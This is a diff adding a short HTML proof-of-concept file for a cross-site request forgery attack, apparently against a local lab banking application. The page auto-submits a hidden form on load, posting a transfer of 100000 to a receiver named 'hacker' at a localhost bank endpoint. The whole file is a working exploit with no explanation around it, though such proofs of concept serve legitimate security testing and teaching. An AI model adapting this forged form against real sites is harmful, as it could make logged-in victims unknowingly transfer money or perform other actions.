@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <h2>CSRF Proof of Concept</h2>
+    <form action="http://localhost/bank/bank.php" method="POST">
+<input type="hidden" name="amt" value="100000">
+        <input type="hidden" name="reciever" value="hacker">
+    </form>
+</body>
+</html>
